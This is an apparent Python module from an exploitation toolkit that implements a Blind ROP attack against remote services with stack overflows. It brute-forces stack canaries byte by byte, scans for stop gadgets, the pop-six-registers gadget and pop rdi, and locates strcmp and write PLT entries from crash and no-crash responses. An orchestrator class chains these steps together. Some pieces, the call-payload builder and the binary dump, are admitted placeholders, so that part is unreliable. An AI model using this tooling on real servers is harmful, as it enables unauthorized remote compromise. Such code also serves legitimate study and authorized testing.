"""
Blind ROP (BROP) Infrastructure Module.

Provides tools for exploiting buffer overflows when you don't have
access to the binary, using only crash/no-crash responses.
"""

from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from enum import Enum, auto
import time

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class ProbeResult(Enum):
    """Result of a BROP probe."""
    CRASH = auto()
    NO_CRASH = auto()
    TIMEOUT = auto()
    OUTPUT = auto()


@dataclass
class BROPGadget:
    """A gadget discovered through BROP."""
    address: int
    gadget_type: str
    verified: bool = False
    confidence: float = 0.5
    notes: List[str] = field(default_factory=list)


@dataclass
class BROPState:
    """Current state of BROP exploitation."""
    stack_canary: Optional[int] = None
    canary_offset: Optional[int] = None
    ret_offset: int = 0
    stop_gadget: Optional[int] = None
    brop_gadget: Optional[int] = None  # pop rbx; pop rbp; pop r12-r15; ret
    pop_rdi: Optional[int] = None
    pop_rsi_r15: Optional[int] = None
    pop_rdx: Optional[int] = None
    write_plt: Optional[int] = None
    strcmp_plt: Optional[int] = None
    puts_plt: Optional[int] = None
    binary_base: Optional[int] = None
    discovered_gadgets: List[BROPGadget] = field(default_factory=list)


class BROPOracle:
    """
    Oracle for BROP - determines if a probe crashes or not.

    You must provide a probe function that:
    - Takes payload bytes
    - Returns ProbeResult (CRASH, NO_CRASH, OUTPUT, TIMEOUT)
    """

    def __init__(self, probe_fn: Callable[[bytes], ProbeResult]):
        """
        Initialize BROP oracle.

        Args:
            probe_fn: Function that probes target with payload
        """
        self.probe = probe_fn
        self.probe_count = 0
        self.cache: Dict[bytes, ProbeResult] = {}

    def test(self, payload: bytes, use_cache: bool = True) -> ProbeResult:
        """
        Test a payload.

        Args:
            payload: Payload to send
            use_cache: Whether to use cached results

        Returns:
            ProbeResult
        """
        if use_cache and payload in self.cache:
            return self.cache[payload]

        result = self.probe(payload)
        self.probe_count += 1
        self.cache[payload] = result

        return result


class StackCanaryLeaker:
    """
    Leaks stack canary byte-by-byte using BROP technique.

    The canary is typically 8 bytes on 64-bit, starting with 0x00.
    """

    def __init__(self, oracle: BROPOracle, ret_offset: int, bits: int = 64):
        """
        Initialize canary leaker.

        Args:
            oracle: BROP oracle
            ret_offset: Offset to return address
            bits: Architecture bits
        """
        self.oracle = oracle
        self.ret_offset = ret_offset
        self.bits = bits
        self.word_size = bits // 8
        self.canary_offset = ret_offset - (2 * self.word_size)  # canary is before saved rbp

    def leak_canary(self) -> Optional[int]:
        """
        Leak the stack canary byte-by-byte.

        Returns:
            Leaked canary value or None
        """
        canary_bytes = []

        # First byte is usually 0x00
        canary_bytes.append(0x00)

        # Leak remaining 7 bytes
        for byte_pos in range(1, self.word_size):
            byte_val = self._leak_byte(byte_pos, canary_bytes)
            if byte_val is None:
                logger.error(f"Failed to leak canary byte {byte_pos}")
                return None
            canary_bytes.append(byte_val)
            logger.info(f"Canary byte {byte_pos}: 0x{byte_val:02x}")

        # Construct canary
        canary = int.from_bytes(bytes(canary_bytes), 'little')
        logger.info(f"Leaked canary: 0x{canary:016x}")

        return canary

    def _leak_byte(
        self,
        byte_pos: int,
        known_bytes: List[int],
    ) -> Optional[int]:
        """
        Leak a single byte of the canary.

        Args:
            byte_pos: Position of byte to leak
            known_bytes: Already known bytes

        Returns:
            Leaked byte value
        """
        # Build payload up to this byte
        for guess in range(256):
            test_bytes = known_bytes + [guess]
            payload = self._build_canary_probe(test_bytes)

            result = self.oracle.test(payload)

            if result == ProbeResult.NO_CRASH:
                return guess

        return None

    def _build_canary_probe(self, canary_bytes: List[int]) -> bytes:
        """Build payload to test canary bytes."""
        payload = b'A' * self.canary_offset
        payload += bytes(canary_bytes)
        return payload


class StopGadgetFinder:
    """
    Finds "stop gadgets" - addresses that don't crash.

    Stop gadgets are used to detect when we've found useful gadgets
    that return cleanly.
    """

    def __init__(
        self,
        oracle: BROPOracle,
        ret_offset: int,
        canary: int = 0,
        bits: int = 64,
    ):
        """
        Initialize stop gadget finder.

        Args:
            oracle: BROP oracle
            ret_offset: Offset to return address
            canary: Stack canary value (if known)
            bits: Architecture bits
        """
        self.oracle = oracle
        self.ret_offset = ret_offset
        self.canary = canary
        self.bits = bits
        self.word_size = bits // 8

    def find_stop_gadget(
        self,
        base_addr: int = 0x400000,
        search_range: int = 0x100000,
        step: int = 0x100,
    ) -> Optional[int]:
        """
        Find a stop gadget (address that doesn't crash).

        Args:
            base_addr: Starting address for search
            search_range: Range to search
            step: Step size

        Returns:
            Stop gadget address or None
        """
        logger.info(f"Searching for stop gadget from {hex(base_addr)}...")

        for addr in range(base_addr, base_addr + search_range, step):
            payload = self._build_probe(addr)
            result = self.oracle.test(payload)

            if result == ProbeResult.NO_CRASH:
                logger.info(f"Found potential stop gadget: {hex(addr)}")
                # Verify it's consistent
                if self._verify_stop_gadget(addr):
                    return addr

        return None

    def _verify_stop_gadget(self, addr: int, attempts: int = 3) -> bool:
        """Verify stop gadget is reliable."""
        for _ in range(attempts):
            payload = self._build_probe(addr)
            result = self.oracle.test(payload, use_cache=False)
            if result != ProbeResult.NO_CRASH:
                return False
        return True

    def _build_probe(self, addr: int) -> bytes:
        """Build payload to test an address."""
        try:
            from pwn import p64, p32
            pack = p64 if self.bits == 64 else p32
        except ImportError:
            def pack(x):
                return x.to_bytes(self.word_size, 'little')

        payload = b'A' * (self.ret_offset - 2 * self.word_size)

        if self.canary:
            payload += pack(self.canary)
            payload += pack(0)  # saved rbp
        else:
            payload = b'A' * self.ret_offset

        payload += pack(addr)

        return payload


class BROPGadgetFinder:
    """
    Finds BROP gadgets using the stop gadget technique.

    The classic BROP gadget is: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    which appears in __libc_csu_init.
    """

    def __init__(
        self,
        oracle: BROPOracle,
        stop_gadget: int,
        ret_offset: int,
        canary: int = 0,
        bits: int = 64,
    ):
        """
        Initialize BROP gadget finder.

        Args:
            oracle: BROP oracle
            stop_gadget: Known stop gadget address
            ret_offset: Offset to return address
            canary: Stack canary value
            bits: Architecture bits
        """
        self.oracle = oracle
        self.stop_gadget = stop_gadget
        self.ret_offset = ret_offset
        self.canary = canary
        self.bits = bits
        self.word_size = bits // 8

    def find_brop_gadget(
        self,
        base_addr: int = 0x400000,
        search_range: int = 0x100000,
    ) -> Optional[int]:
        """
        Find the BROP gadget (pop x6; ret pattern).

        The BROP gadget pops 6 registers then returns.
        We detect it by: if we put stop_gadget at return,
        it should return to stop_gadget after popping 6 values.

        Returns:
            BROP gadget address or None
        """
        logger.info("Searching for BROP gadget...")

        for addr in range(base_addr, base_addr + search_range, 1):
            # Test if this pops 6 values then returns to stop gadget
            if self._test_pop_count(addr, 6):
                logger.info(f"Found potential BROP gadget: {hex(addr)}")
                return addr

        return None

    def find_pop_rdi(
        self,
        base_addr: int = 0x400000,
        search_range: int = 0x100000,
    ) -> Optional[int]:
        """
        Find pop rdi; ret gadget.

        This pops 1 register then returns.

        Returns:
            Gadget address or None
        """
        logger.info("Searching for pop rdi; ret...")

        for addr in range(base_addr, base_addr + search_range, 1):
            if self._test_pop_count(addr, 1):
                # Verify it's actually pop rdi by using it
                return addr

        return None

    def _test_pop_count(self, addr: int, pop_count: int) -> bool:
        """
        Test if address pops exactly N values then returns.

        Uses the technique of placing stop gadget after N pops.
        """
        try:
            from pwn import p64, p32
            pack = p64 if self.bits == 64 else p32
        except ImportError:
            def pack(x):
                return x.to_bytes(self.word_size, 'little')

        # Build payload: overflow + canary + rbp + addr + [junk]*N + stop_gadget
        payload = b'A' * (self.ret_offset - 2 * self.word_size)

        if self.canary:
            payload += pack(self.canary)
            payload += pack(0)  # rbp
        else:
            payload = b'A' * self.ret_offset

        payload += pack(addr)  # Test address
        payload += pack(0) * pop_count  # Values to pop
        payload += pack(self.stop_gadget)  # Return to stop gadget

        result = self.oracle.test(payload)
        return result == ProbeResult.NO_CRASH


class PLTFinder:
    """
    Finds PLT entries using BROP.

    Uses signature-based detection to find specific functions.
    """

    def __init__(
        self,
        oracle: BROPOracle,
        brop_gadget: int,
        stop_gadget: int,
        ret_offset: int,
        canary: int = 0,
        bits: int = 64,
    ):
        """
        Initialize PLT finder.

        Args:
            oracle: BROP oracle
            brop_gadget: BROP gadget address
            stop_gadget: Stop gadget address
            ret_offset: Offset to return address
            canary: Stack canary value
            bits: Architecture bits
        """
        self.oracle = oracle
        self.brop_gadget = brop_gadget
        self.stop_gadget = stop_gadget
        self.ret_offset = ret_offset
        self.canary = canary
        self.bits = bits
        self.word_size = bits // 8

    def find_strcmp_plt(
        self,
        plt_base: int = 0x400000,
        plt_range: int = 0x1000,
    ) -> Optional[int]:
        """
        Find strcmp@plt.

        strcmp has a distinctive signature:
        - strcmp(readable, readable) -> no crash
        - strcmp(bad_ptr, readable) -> crash
        - strcmp(readable, bad_ptr) -> crash

        Returns:
            strcmp PLT address or None
        """
        logger.info("Searching for strcmp@plt...")

        readable_addr = self.stop_gadget  # We know this is readable
        bad_addr = 0  # Null pointer

        for addr in range(plt_base, plt_base + plt_range, 0x10):
            # Test: strcmp(readable, readable) should not crash
            if self._test_strcmp(addr, readable_addr, readable_addr):
                # Verify: strcmp(bad, readable) should crash
                if not self._test_strcmp(addr, bad_addr, readable_addr):
                    logger.info(f"Found strcmp@plt: {hex(addr)}")
                    return addr

        return None

    def find_write_plt(
        self,
        plt_base: int = 0x400000,
        plt_range: int = 0x1000,
    ) -> Optional[int]:
        """
        Find write@plt.

        write(fd, buf, len) will produce output if fd=1 (stdout).

        Returns:
            write PLT address or None
        """
        logger.info("Searching for write@plt...")

        readable_addr = self.stop_gadget

        for addr in range(plt_base, plt_base + plt_range, 0x10):
            # Test: write(1, readable, 8) should produce output
            result = self._test_write(addr, 1, readable_addr, 8)
            if result == ProbeResult.OUTPUT:
                logger.info(f"Found write@plt: {hex(addr)}")
                return addr

        return None

    def _test_strcmp(self, plt_addr: int, arg1: int, arg2: int) -> bool:
        """Test if calling plt_addr with args behaves like strcmp."""
        try:
            from pwn import p64
        except ImportError:
            def p64(x):
                return x.to_bytes(8, 'little')

        # Build ROP chain: pop_rdi; arg1; pop_rsi_r15; arg2; 0; plt_addr; stop
        # Note: This is simplified, actual implementation needs proper gadgets
        payload = self._build_call_payload(plt_addr, [arg1, arg2])
        result = self.oracle.test(payload)
        return result == ProbeResult.NO_CRASH

    def _test_write(self, plt_addr: int, fd: int, buf: int, count: int) -> ProbeResult:
        """Test if calling plt_addr behaves like write."""
        payload = self._build_call_payload(plt_addr, [fd, buf, count])
        return self.oracle.test(payload)

    def _build_call_payload(self, func: int, args: List[int]) -> bytes:
        """Build payload to call function with arguments."""
        try:
            from pwn import p64
        except ImportError:
            def p64(x):
                return x.to_bytes(8, 'little')

        payload = b'A' * (self.ret_offset - 16)

        if self.canary:
            payload += p64(self.canary)
            payload += p64(0)

        # This is a placeholder - real implementation needs discovered gadgets
        payload += p64(func)
        payload += p64(self.stop_gadget)

        return payload


class BROPExploiter:
    """
    Main BROP exploitation class.

    Orchestrates the entire BROP attack:
    1. Find stack canary
    2. Find stop gadget
    3. Find BROP gadget
    4. Find PLT entries
    5. Dump binary via write
    6. Build final ROP chain
    """

    def __init__(self, probe_fn: Callable[[bytes], ProbeResult], bits: int = 64):
        """
        Initialize BROP exploiter.

        Args:
            probe_fn: Function to probe target
            bits: Architecture bits
        """
        self.oracle = BROPOracle(probe_fn)
        self.bits = bits
        self.state = BROPState()

    def run(
        self,
        ret_offset: int,
        has_canary: bool = True,
        base_addr: int = 0x400000,
    ) -> BROPState:
        """
        Run full BROP attack.

        Args:
            ret_offset: Offset to return address
            has_canary: Whether binary has stack canary
            base_addr: Likely binary base address

        Returns:
            BROPState with discovered information
        """
        self.state.ret_offset = ret_offset

        # Step 1: Leak canary if present
        if has_canary:
            leaker = StackCanaryLeaker(self.oracle, ret_offset, self.bits)
            canary = leaker.leak_canary()
            if canary:
                self.state.stack_canary = canary
                self.state.canary_offset = leaker.canary_offset
            else:
                logger.error("Failed to leak canary")
                return self.state

        # Step 2: Find stop gadget
        stop_finder = StopGadgetFinder(
            self.oracle, ret_offset, self.state.stack_canary or 0, self.bits
        )
        stop = stop_finder.find_stop_gadget(base_addr)
        if stop:
            self.state.stop_gadget = stop
        else:
            logger.error("Failed to find stop gadget")
            return self.state

        # Step 3: Find BROP gadget
        brop_finder = BROPGadgetFinder(
            self.oracle, stop, ret_offset, self.state.stack_canary or 0, self.bits
        )
        brop = brop_finder.find_brop_gadget(base_addr)
        if brop:
            self.state.brop_gadget = brop

        # Find pop rdi
        pop_rdi = brop_finder.find_pop_rdi(base_addr)
        if pop_rdi:
            self.state.pop_rdi = pop_rdi

        # Step 4: Find PLT entries
        if self.state.brop_gadget and self.state.pop_rdi:
            plt_finder = PLTFinder(
                self.oracle, self.state.brop_gadget, stop,
                ret_offset, self.state.stack_canary or 0, self.bits
            )

            # Find write/puts for binary dump
            write_plt = plt_finder.find_write_plt(base_addr)
            if write_plt:
                self.state.write_plt = write_plt

        logger.info(f"BROP attack complete. Probes: {self.oracle.probe_count}")
        return self.state

    def dump_binary(self, output_path: str) -> bool:
        """
        Dump the remote binary using discovered primitives.

        Args:
            output_path: Where to save dumped binary

        Returns:
            True if successful
        """
        if not self.state.write_plt or not self.state.pop_rdi:
            logger.error("Need write@plt and pop_rdi to dump binary")
            return False

        # Implementation would use write to dump memory
        # This is placeholder for the concept
        logger.info("Binary dump requires interactive connection")
        return False
